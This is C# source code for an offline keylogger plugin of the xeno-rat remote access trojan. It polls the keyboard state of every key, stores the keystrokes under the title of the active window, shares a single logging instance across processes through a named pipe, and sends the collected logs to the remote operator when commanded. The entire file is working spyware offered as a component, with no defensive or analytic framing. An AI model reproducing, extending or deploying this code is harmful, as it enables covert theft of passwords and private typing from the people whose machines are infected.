using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        bool started = false;
        bool owner = true;
        bool FULLSTOP = false;
        CancellationTokenSource FULLSTOP_token = new CancellationTokenSource();
        Dictionary<string, string> applicationkeylogs;
        string pipename = "OfflineKeyloggerPipe";
        NamedPipeClientStream client;
        Node node;
        public async Task Run(Node node)// get server side intergation (I mean like xeno-rat gui) into this too (of course). Oh and last but not least, PROPER ERROR HANDLING, this is a mess waiting to happen!
        {
            await node.SendAsync(new byte[] { 3 });
            this.node = node;
            try
            {
                if (!PipeExists())
                {
                    StartServer();
                }
                else
                {
                    owner = false;
                    client = new NamedPipeClientStream(".", pipename, PipeDirection.InOut, PipeOptions.Asynchronous);
                    await client.ConnectAsync();
                }
                await node.SendAsync(new byte[] { 1 });
            }
            catch 
            {
                await node.SendAsync(new byte[] { 0 });
                await Task.Delay(1000);
                return;
            }
            while (node.Connected()) 
            {
                try
                {
                    byte[] data = await node.ReceiveAsync();
                    if (data == null)
                    {
                        break;
                    }
                    else if (data[0] == 0)
                    {
                        byte[] hasstarted = new byte[] { 0 };
                        if (await IsStarted())
                        {
                            hasstarted = new byte[] { 1 };
                        }
                        await node.SendAsync(hasstarted);
                    }
                    else if (data[0] == 1)
                    {
                        await Start();
                    }
                    else if (data[0] == 2)
                    {
                        await Stop();
                    }
                    else if (data[0] == 3)
                    {
                        Dictionary<string, string> logs = await GetKeylogs();
                        byte[] dict_data = ConvertDictionaryToBytes(logs);
                        await node.SendAsync(dict_data);

                    }
                    else if (data[0] == 4)
                    {
                        await DO_FULLSTOP();
                        node.Disconnect();
                        break;
                    }
                }
                catch (Exception e)
                {
                    node.Disconnect();
                    break;
                }
            }
            if (owner) 
            {
                while (!FULLSTOP) 
                {
                    await Task.Delay(5000);
                }
            }

        }

        public bool PipeExists() 
        {
            return Directory.GetFiles(@"\\.\pipe\").Contains($@"\\.\pipe\{pipename}");
        }

        public async Task StartServer() 
        {

            applicationkeylogs = new Dictionary<string, string>();
            keylogloop();
            while (!FULLSTOP)
            {
                NamedPipeServerStream server = new NamedPipeServerStream(pipename, PipeDirection.InOut, 254, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
                await server.WaitForConnectionAsync(FULLSTOP_token.Token);
                if (FULLSTOP)
                {
                    server.Dispose();
                    break;
                }
                Handler(server);
            }
        }

        public async Task Handler(NamedPipeServerStream server) 
        {
            while (!FULLSTOP)
            {
                byte[] recv = new byte[] { 0 };
                int recvlen = 0;
                try
                {
                    recvlen = await server.ReadAsync(recv, 0, 1, FULLSTOP_token.Token);
                }
                catch { }
                if (recvlen == 0)
                {
                    try
                    {
                        server.Disconnect();
                    }
                    catch { }
                    server.Dispose();
                    break;
                }
                if (recv[0] == 1)
                {
                    byte istarted = 0;
                    if (started)
                    {
                        istarted = 1;
                    }
                    try
                    {
                        await server.WriteAsync(new byte[] { 1, istarted }, 0, 2);
                    }
                    catch { }
                }
                else if (recv[0] == 2)
                {
                    started = true;
                }
                else if (recv[0] == 3)
                {
                    started = false;
                }
                else if (recv[0] == 4)
                {
                    try
                    {
                        byte[] op = new byte[] { 4 };
                        byte[] payload = ConvertDictionaryToBytes(applicationkeylogs);
                        byte[] length = node.sock.IntToBytes(payload.Length);
                        byte[] partial_payload = SocketHandler.Concat(length, payload);
                        byte[] final_payload = SocketHandler.Concat(op, partial_payload);
                        await server.WriteAsync(final_payload, 0, final_payload.Length);
                    }
                    catch { }
                }
                else if (recv[0] == 5) 
                {
                    FULLSTOP = true;
                    try
                    {
                        FULLSTOP_token.Cancel();
                        FULLSTOP_token.Dispose();
                        server.Dispose();
                    }
                    catch { }
                    return;
                }
            }

        }

        public async Task DO_FULLSTOP() 
        {
            if (owner) 
            {
                FULLSTOP = true;
                FULLSTOP_token.Cancel();
                FULLSTOP_token.Dispose();
                return;
            }
            try
            {
                await client.WriteAsync(new byte[] { 5 }, 0, 1);
            }
            catch { }
            }

        public async Task keylogloop() 
        {
            while (!FULLSTOP) 
            {
                if (!started) 
                {
                    await Task.Delay(1000);
                }
                string retchar = await GetKey();
                if (retchar != null)
                {
                    string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*","");
                    if (!applicationkeylogs.ContainsKey(open_application)) 
                    {
                        applicationkeylogs.Add(open_application, "");
                    }
                    applicationkeylogs[open_application] += retchar;
                }
            }
        }

        private static byte[] ConvertDictionaryToBytes(Dictionary<string, string> dictionary)
        {
            List<byte> byteList = new List<byte>();

            foreach (var kvp in dictionary)
            {
                byteList.AddRange(Encoding.UTF8.GetBytes(kvp.Key));
                byteList.Add(0); // Null terminator between key and value
                byteList.AddRange(Encoding.UTF8.GetBytes(kvp.Value));
                byteList.Add(0); // Null terminator between value pairs
            }

            return byteList.ToArray();
        }

        private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            string currentKey = null;
            StringBuilder currentValue = new StringBuilder();

            for (int i = offset; i < data.Length; i++)
            {
                byte currentByte = data[i];

                if (currentByte == 0)
                {
                    // Null terminator indicates the end of a key or a value
                    if (currentKey == null)
                    {
                        currentKey = currentValue.ToString(); // Use ToString to get the string
                        currentValue.Clear();
                    }
                    else
                    {
                        dictionary[currentKey] = currentValue.ToString(); // Use ToString to get the string
                        currentKey = null;
                        currentValue.Clear();
                    }
                }
                else
                {
                    currentValue.Append((char)currentByte);
                }
            }

            return dictionary;
        }



        public async Task<Dictionary<string, string>> GetKeylogs(int count=0) 
        {
            if (count > 3)
            {
                return null;
            }
            if (owner)
            {
                return applicationkeylogs;
            }
            await client.WriteAsync(new byte[] { 4 }, 0, 1);
            byte[] recv_buf = new byte[] { 0, 0,0,0,0 };
            CancellationTokenSource token = new CancellationTokenSource(2000);
            try
            {
                await client.ReadAsync(recv_buf, 0, 5, token.Token);
            }
            catch { }
            token.Dispose();
            if (recv_buf[0] == 4)
            {
                int len= node.sock.BytesToInt(recv_buf, 1);
                token = new CancellationTokenSource(5000);
                recv_buf=new byte[len];
                int recvied = 0;
                try
                {
                    int totalBytesReceived = 0;

                    while (totalBytesReceived < len)
                    {
                        recvied = await client.ReadAsync(recv_buf, totalBytesReceived, len - totalBytesReceived, token.Token);
                        if (recvied == 0)
                        {
                            recvied = 0;
                            break;
                        }
                        totalBytesReceived += recvied;
                    }
                }
                catch 
                {
                    recvied = 0;
                }
                token.Dispose();
                if (recvied == 0) 
                { 
                    return await GetKeylogs(count + 1);
                }
                return ConvertBytesToDictionary(recv_buf, 0);
            }
            else
            {
                return await GetKeylogs(count + 1);
            }

        }
        public async Task Start() 
        {
            if (owner)
            {
                started = true;
                return;
            }
            await client.WriteAsync(new byte[] { 2 }, 0, 1);
        }
        public async Task Stop()
        {
            if (owner)
            {
                started = false;
                return;
            }
            await client.WriteAsync(new byte[] { 3 }, 0, 1);
        }
        public async Task<bool> IsStarted(int count=0) 
        {
            if (count > 3) 
            {
                return false;
            }
            if (owner) 
            {
                return started;
            }
            await client.WriteAsync(new byte[] { 1 }, 0, 1);
            byte[] recv_buf=new byte[] { 0, 0};
            CancellationTokenSource token = new CancellationTokenSource(3000);
            await client.ReadAsync(recv_buf, 0, 2, token.Token);
            token.Dispose();
            if (recv_buf[0] == 1)
            {
                return recv_buf[1] == 1;
            }
            else 
            {
                return await IsStarted(count + 1);
            }
        }
        private async Task<string> GetKey()
        {
            return await Task.Run(() =>
            {
                for (int i = 0; i < 255; i++)
                {
                    short state = GetAsyncKeyState(i);

                    if ((state & 0x8000) != 0 && !keyStates[i])
                    {
                        keyStates[i] = true;

                        bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                        string character = GetCharacterFromKey((uint)i, isShiftPressed);
                        return character;
                    }
                    else if ((state & 0x8000) == 0 && keyStates[i])
                    {
                        keyStates[i] = false;
                    }
                }
                return null;
            });
        }


        private static Dictionary<uint, string> nonVisibleCharacters = new Dictionary<uint, string>()
        {
            { 0x08, "[backspace]" },
            { 0x09, "[tab]" },
            { 0x0D, "[enter]" },
            { 0x1B, "[escape]" },
            { 0x20, "[space]" },
            { 0x2E, "[delete]" },
            { 0x25, "[left]" },
            { 0x26, "[up]" },
            { 0x27, "[right]" },
            { 0x28, "[down]" },
            { 0x2C, "[print screen]" },
            { 0x2D, "[insert]" },
            { 0x2F, "[help]" },
            { 0x5B, "[left windows]" },
            { 0x5C, "[right windows]" },
            { 0x5D, "[applications]" },
            { 0x5F, "[sleep]" },
            { 0x70, "[F1]" },
            { 0x71, "[F2]" },
            { 0x72, "[F3]" },
            { 0x73, "[F4]" },
            { 0x74, "[F5]" },
            { 0x75, "[F6]" },
            { 0x76, "[F7]" },
            { 0x77, "[F8]" },
            { 0x78, "[F9]" },
            { 0x79, "[F10]" },
            { 0x7A, "[F11]" },
            { 0x7B, "[F12]" },
            { 0xBA, ";" },
            { 0xBB, "=" },
            { 0xBC, "," },
            { 0xBD, "-" },
            { 0xBE, "." },
            { 0xBF, "/" },
            { 0xC0, "`" },
            { 0xDB, "[" },
            { 0xDC, "\\" },
            { 0xDD, "]" },
            { 0xDE, "'" },
            { 0xDF, "[caps lock]" },
            { 0xE1, "[ime hangul mode]" },
            { 0xE3, "[ime junja mode]" },
            { 0xE4, "[ime final mode]" },
            { 0xE5, "[ime kanji mode]" },
            { 0xE6, "[ime hanja mode]" },
            { 0xE8, "[ime off]" },
            { 0xE9, "[ime on]" },
            { 0xEA, "[ime convert]" },
            { 0xEB, "[ime non-convert]" },
            { 0xEC, "[ime accept]" },
            { 0xED, "[ime mode change request]" },
            { 0xF1, "[oem specific]" },
            { 0xFF, "[oem auto]" },
            { 0xFE, "[oem enlarge window]" },
            { 0xFD, "[oem reduce window]" },
            { 0xFC, "[oem copy]" },
            { 0xFB, "[oem enlarge font]" },
            { 0xFA, "[oem reduce font]" },
            { 0xF9, "[oem jump]" },
            { 0xF8, "[oem pa1]" },
            { 0xF7, "[oem clear]" }
        };

        private static bool[] keyStates = new bool[256];

        private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
        {
            StringBuilder receivingBuffer = new StringBuilder(5);
            byte[] keyboardState = new byte[256];

            // Set the state of Shift key based on the passed parameter
            keyboardState[0x10] = (byte)(isShiftPressed ? 0x80 : 0);

            // Map the virtual key to the corresponding character
            int result = ToUnicode(virtualKeyCode, 0, keyboardState, receivingBuffer, receivingBuffer.Capacity, 0);

            if (result > 0)
            {
                string character = receivingBuffer.ToString();

                // Replace non-visible characters with descriptive words using the dictionary
                if (nonVisibleCharacters.ContainsKey(virtualKeyCode))
                {
                    string nonVisibleCharacter = nonVisibleCharacters[virtualKeyCode];

                    // Apply Shift key state to the non-visible character
                    if (isShiftPressed)
                    {
                        // Apply Shift key modifications based on the non-visible character
                        switch (nonVisibleCharacter)
                        {
                            case ";":
                                return ":";
                            case "=":
                                return "+";
                            case ",":
                                return "<";
                            case "-":
                                return "_";
                            case ".":
                                return ">";
                            case "/":
                                return "?";
                            case "`":
                                return "~";
                            case "[":
                                return "{";
                            case "\\":
                                return "|";
                            case "]":
                                return "}";
                            case "'":
                                return "\"";
                        }
                    }

                    return nonVisibleCharacter;
                }

                return character;
            }

            return string.Empty;
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);


        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
            int bufferSize, uint flags);
    }
}
